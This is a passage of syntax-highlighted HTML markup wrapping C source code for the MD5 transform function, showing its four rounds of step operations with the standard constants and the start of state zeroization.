punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> c <span class="token operator">=</span> state<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> d <span class="token operator">=</span> state<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span> x<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">Decode</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> block<span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/* Round 1 */</span>    <span class="token function">FF</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> x<span class="token punctuation">[</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> S11<span class="token punctuation">,</span> <span class="token number">0xd76aa478</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* 1 */</span>    <span class="token function">FF</span><span class="token punctuation">(</span>d<span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">,</span> x<span class="token punctuation">[</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> S12<span class="token punctuation">,</span> <span class="token number">0xe8c7b756</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* 2 */</span>    <span class="token function">FF</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> x<span class="token punctuation">[</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> S13<span class="token punctuation">,</span> <span class="token number">0x242070db</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* 3 */</span>    <span class="token function">FF</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span> c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> a<span class="token punctuation">,</span> x<span class="token punctuation">[</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span> S14<span class="token punctuation">,</span> <span class="token number">0xc1bdceee</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* 4 */</span>    <span class="token function">FF</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> x<span class="token punctuation">[</span> <span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span> S11<span class="token punctuation">,</span> <span class="token number">0xf57c0faf</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* 5 */</span>    <span class="token function">FF</span><span class="token punctuation">(</span>d<span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">,</span> x<span class="token punctuation">[</span> <span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">,</span> S12<span class="token punctuation">,</span> <span class="token number">0x4787c62a</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* 6 */</span>    <span class="token function">FF</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> x<span class="token punctuation">[</span> <span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">,</span> S13<span class="token punctuation">,</span> <span class="token number">0xa8304613</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* 7 */</span>    <span class="token function">FF</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span> c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> a<span class="token punctuation">,</span> x<span class="token punctuation">[</span> <span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">,</span> S14<span class="token punctuation">,</span> <span class="token number">0xfd469501</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* 8 */</span>    <span class="token function">FF</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> x<span class="token punctuation">[</span> <span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span> S11<span class="token punctuation">,</span> <span class="token number">0x698098d8</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* 9 */</span>    <span class="token function">FF</span><span class="token punctuation">(</span>d<span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">,</span> x<span class="token punctuation">[</span> <span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">,</span> S12<span class="token punctuation">,</span> <span class="token number">0x8b44f7af</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* 10 */</span>    <span class="token function">FF</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> x<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">,</span> S13<span class="token punctuation">,</span> <span class="token number">0xffff5bb1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* 11 */</span>    <span class="token function">FF</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span> c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> a<span class="token punctuation">,</span> x<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span><span class="token punctuation">,</span> S14<span class="token punctuation">,</span> <span class="token number">0x895cd7be</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* 12 */</span>    <span class="token function">FF</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> x<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token punctuation">,</span> S11<span class="token punctuation">,</span> <span class="token number">0x6b901122</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* 13 */</span>    <span class="token function">FF</span><span class="token punctuation">(</span>d<span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">,</span> x<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span><span class="token punctuation">,</span> S12<span class="token punctuation">,</span> <span class="token number">0xfd987193</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* 14 */</span>    <span class="token function">FF</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> x<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span><span class="token punctuation">,</span> S13<span class="token punctuation">,</span> <span class="token number">0xa679438e</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* 15 */</span>    <span class="token function">FF</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span> c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> a<span class="token punctuation">,</span> x<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token punctuation">,</span> S14<span class="token punctuation">,</span> <span class="token number">0x49b40821</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* 16 */</span>    <span class="token comment" spellcheck="true">/* Round 2 */</span>    <span class="token function">GG</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> x<span class="token punctuation">[</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> S21<span class="token punctuation">,</span> <span class="token number">0xf61e2562</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* 17 */</span>    <span class="token function">GG</span><span class="token punctuation">(</span>d<span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">,</span> x<span class="token punctuation">[</span> <span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">,</span> S22<span class="token punctuation">,</span> <span class="token number">0xc040b340</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* 18 */</span>    <span class="token function">GG</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> x<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span><span class="token punctuation">,</span> S23<span class="token punctuation">,</span> <span class="token number">0x265e5a51</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* 19 */</span>    <span class="token function">GG</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span> c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> a<span class="token punctuation">,</span> x<span class="token punctuation">[</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> S24<span class="token punctuation">,</span> <span class="token number">0xe9b6c7aa</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* 20 */</span>    <span class="token function">GG</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> x<span class="token punctuation">[</span> <span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">,</span> S21<span class="token punctuation">,</span> <span class="token number">0xd62f105d</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* 21 */</span>    <span class="token function">GG</span><span class="token punctuation">(</span>d<span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">,</span> x<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">,</span> S22<span class="token punctuation">,</span>  <span class="token number">0x2441453</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* 22 */</span>    <span class="token function">GG</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> x<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token punctuation">,</span> S23<span class="token punctuation">,</span> <span class="token number">0xd8a1e681</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* 23 */</span>    <span class="token function">GG</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span> c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> a<span class="token punctuation">,</span> x<span class="token punctuation">[</span> <span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span> S24<span class="token punctuation">,</span> <span class="token number">0xe7d3fbc8</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* 24 */</span>    <span class="token function">GG</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> x<span class="token punctuation">[</span> <span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">,</span> S21<span class="token punctuation">,</span> <span class="token number">0x21e1cde6</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* 25 */</span>    <span class="token function">GG</span><span class="token punctuation">(</span>d<span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">,</span> x<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span><span class="token punctuation">,</span> S22<span class="token punctuation">,</span> <span class="token number">0xc33707d6</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* 26 */</span>    <span class="token function">GG</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> x<span class="token punctuation">[</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span> S23<span class="token punctuation">,</span> <span class="token number">0xf4d50d87</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* 27 */</span>    <span class="token function">GG</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span> c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> a<span class="token punctuation">,</span> x<span class="token punctuation">[</span> <span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span> S24<span class="token punctuation">,</span> <span class="token number">0x455a14ed</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* 28 */</span>    <span class="token function">GG</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> x<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span><span class="token punctuation">,</span> S21<span class="token punctuation">,</span> <span class="token number">0xa9e3e905</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* 29 */</span>    <span class="token function">GG</span><span class="token punctuation">(</span>d<span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">,</span> x<span class="token punctuation">[</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> S22<span class="token punctuation">,</span> <span class="token number">0xfcefa3f8</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* 30 */</span>    <span class="token function">GG</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> x<span class="token punctuation">[</span> <span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">,</span> S23<span class="token punctuation">,</span> <span class="token number">0x676f02d9</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* 31 */</span>    <span class="token function">GG</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span> c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> a<span class="token punctuation">,</span> x<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token punctuation">,</span> S24<span class="token punctuation">,</span> <span class="token number">0x8d2a4c8a</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* 32 */</span>    <span class="token comment" spellcheck="true">/* Round 3 */</span>    <span class="token function">HH</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> x<span class="token punctuation">[</span> <span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">,</span> S31<span class="token punctuation">,</span> <span class="token number">0xfffa3942</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* 33 */</span>    <span class="token function">HH</span><span class="token punctuation">(</span>d<span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">,</span> x<span class="token punctuation">[</span> <span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span> S32<span class="token punctuation">,</span> <span class="token number">0x8771f681</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* 34 */</span>    <span class="token function">HH</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> x<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span><span class="token punctuation">,</span> S33<span class="token punctuation">,</span> <span class="token number">0x6d9d6122</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* 35 */</span>    <span class="token function">HH</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span> c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> a<span class="token punctuation">,</span> x<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span><span class="token punctuation">,</span> S34<span class="token punctuation">,</span> <span class="token number">0xfde5380c</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* 36 */</span>    <span class="token function">HH</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> x<span class="token punctuation">[</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> S31<span class="token punctuation">,</span> <span class="token number">0xa4beea44</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* 37 */</span>    <span class="token function">HH</span><span class="token punctuation">(</span>d<span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">,</span> x<span class="token punctuation">[</span> <span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span> S32<span class="token punctuation">,</span> <span class="token number">0x4bdecfa9</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* 38 */</span>    <span class="token function">HH</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> x<span class="token punctuation">[</span> <span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">,</span> S33<span class="token punctuation">,</span> <span class="token number">0xf6bb4b60</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* 39 */</span>    <span class="token function">HH</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span> c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> a<span class="token punctuation">,</span> x<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">,</span> S34<span class="token punctuation">,</span> <span class="token number">0xbebfbc70</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* 40 */</span>    <span class="token function">HH</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> x<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span><span class="token punctuation">,</span> S31<span class="token punctuation">,</span> <span class="token number">0x289b7ec6</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* 41 */</span>    <span class="token function">HH</span><span class="token punctuation">(</span>d<span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">,</span> x<span class="token punctuation">[</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> S32<span class="token punctuation">,</span> <span class="token number">0xeaa127fa</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* 42 */</span>    <span class="token function">HH</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> x<span class="token punctuation">[</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span> S33<span class="token punctuation">,</span> <span class="token number">0xd4ef3085</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* 43 */</span>    <span class="token function">HH</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span> c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> a<span class="token punctuation">,</span> x<span class="token punctuation">[</span> <span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">,</span> S34<span class="token punctuation">,</span>  <span class="token number">0x4881d05</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* 44 */</span>    <span class="token function">HH</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> x<span class="token punctuation">[</span> <span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">,</span> S31<span class="token punctuation">,</span> <span class="token number">0xd9d4d039</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* 45 */</span>    <span class="token function">HH</span><span class="token punctuation">(</span>d<span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">,</span> x<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token punctuation">,</span> S32<span class="token punctuation">,</span> <span class="token number">0xe6db99e5</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* 46 */</span>    <span class="token function">HH</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> x<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token punctuation">,</span> S33<span class="token punctuation">,</span> <span class="token number">0x1fa27cf8</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* 47 */</span>    <span class="token function">HH</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span> c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> a<span class="token punctuation">,</span> x<span class="token punctuation">[</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> S34<span class="token punctuation">,</span> <span class="token number">0xc4ac5665</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* 48 */</span>    <span class="token comment" spellcheck="true">/* Round 4 */</span>    <span class="token function">II</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> x<span class="token punctuation">[</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> S41<span class="token punctuation">,</span> <span class="token number">0xf4292244</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* 49 */</span>    <span class="token function">II</span><span class="token punctuation">(</span>d<span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">,</span> x<span class="token punctuation">[</span> <span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">,</span> S42<span class="token punctuation">,</span> <span class="token number">0x432aff97</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* 50 */</span>    <span class="token function">II</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> x<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span><span class="token punctuation">,</span> S43<span class="token punctuation">,</span> <span class="token number">0xab9423a7</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* 51 */</span>    <span class="token function">II</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span> c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> a<span class="token punctuation">,</span> x<span class="token punctuation">[</span> <span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">,</span> S44<span class="token punctuation">,</span> <span class="token number">0xfc93a039</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* 52 */</span>    <span class="token function">II</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> x<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token punctuation">,</span> S41<span class="token punctuation">,</span> <span class="token number">0x655b59c3</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* 53 */</span>    <span class="token function">II</span><span class="token punctuation">(</span>d<span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">,</span> x<span class="token punctuation">[</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span> S42<span class="token punctuation">,</span> <span class="token number">0x8f0ccc92</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* 54 */</span>    <span class="token function">II</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> x<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">,</span> S43<span class="token punctuation">,</span> <span class="token number">0xffeff47d</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* 55 */</span>    <span class="token function">II</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span> c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> a<span class="token punctuation">,</span> x<span class="token punctuation">[</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> S44<span class="token punctuation">,</span> <span class="token number">0x85845dd1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* 56 */</span>    <span class="token function">II</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> x<span class="token punctuation">[</span> <span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span> S41<span class="token punctuation">,</span> <span class="token number">0x6fa87e4f</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* 57 */</span>    <span class="token function">II</span><span class="token punctuation">(</span>d<span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">,</span> x<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token punctuation">,</span> S42<span class="token punctuation">,</span> <span class="token number">0xfe2ce6e0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* 58 */</span>    <span class="token function">II</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> x<span class="token punctuation">[</span> <span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">,</span> S43<span class="token punctuation">,</span> <span class="token number">0xa3014314</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* 59 */</span>    <span class="token function">II</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span> c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> a<span class="token punctuation">,</span> x<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span><span class="token punctuation">,</span> S44<span class="token punctuation">,</span> <span class="token number">0x4e0811a1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* 60 */</span>    <span class="token function">II</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> x<span class="token punctuation">[</span> <span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span> S41<span class="token punctuation">,</span> <span class="token number">0xf7537e82</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* 61 */</span>    <span class="token function">II</span><span class="token punctuation">(</span>d<span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">,</span> x<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span><span class="token punctuation">,</span> S42<span class="token punctuation">,</span> <span class="token number">0xbd3af235</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* 62 */</span>    <span class="token function">II</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> x<span class="token punctuation">[</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> S43<span class="token punctuation">,</span> <span class="token number">0x2ad7d2bb</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* 63 */</span>    <span class="token function">II</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span> c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> a<span class="token punctuation">,</span> x<span class="token punctuation">[</span> <span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">,</span> S44<span class="token punctuation">,</span> <span class="token number">0xeb86d391</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* 64 */</span>    state<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span><span class="token operator">=</span> a<span class="token punctuation">;</span>    state<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span><span class="token operator">=</span> b<span class="token punctuation">;</span>    state<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">+</span><span class="token operator">=</span> c<span class="token punctuation">;</span>    state<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">+</span><span class="token operator">=</span> d<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/* Zeroize sensitive information. */</span>    <span class="token function">R_memset</span><span class="token punctuation">(</span><span 